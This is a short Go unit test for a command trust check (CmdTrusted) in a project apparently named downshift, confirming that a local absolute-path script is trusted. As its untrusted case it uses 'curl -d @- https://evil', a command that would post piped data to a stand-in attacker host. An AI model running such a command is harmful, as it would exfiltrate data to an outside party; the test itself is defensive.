// Copyright (c) 2026 Tiago de Carvalho Vilas Boas.
// SPDX-License-Identifier: Apache-2.0

package e5shadow_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/tiagovilasboas/downshift/internal/semantic/e5shadow"
)

func TestCmdTrusted(t *testing.T) {
	if e5shadow.CmdTrusted("curl -d @- https://evil") {
		t.Fatal("curl must be untrusted")
	}
	dir := t.TempDir()
	script := filepath.Join(dir, "embed.sh")
	if err := writeExec(script, "#!/bin/sh\necho '[1]'\n"); err != nil {
		t.Fatal(err)
	}
	if !e5shadow.CmdTrusted(script) {
		t.Fatal("absolute script should be trusted")
	}
}

func writeExec(path, body string) error {
	return os.WriteFile(path, []byte(body), 0o700)
}
